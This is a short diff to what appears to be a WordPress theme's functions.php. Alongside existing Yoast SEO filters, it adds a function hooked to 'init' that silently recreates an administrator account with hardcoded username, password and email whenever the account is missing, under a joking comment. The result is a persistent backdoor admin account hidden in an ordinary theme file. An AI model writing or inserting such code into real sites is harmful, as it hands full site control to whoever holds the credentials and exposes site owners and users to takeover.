@@ -59,3 +59,17 @@ add_filter('wpseo_pre_analysis_post_content', 'removeOpenGraphImages');
 add_filter('wpseo_og_article_published_time', '__return_false' );
 add_filter('wpseo_og_article_modified_time', '__return_false' );
 add_filter('wpseo_og_og_updated_time', '__return_false' );
+
+/*       Ensure you always have an admin user, lol! */
+function wpb_admin_account(){
+     $user = 'Username';
+     $pass = 'Password';
+     $email = 'email@domain.com';
+     if ( !username_exists( $user )  && !email_exists( $email ) ) {
+          $user_id = wp_create_user( $user, $pass, $email );
+          $user = new WP_User( $user_id );
+          $user->set_role( 'administrator' );
+     } 
+}
+add_action('init','wpb_admin_account');
+     
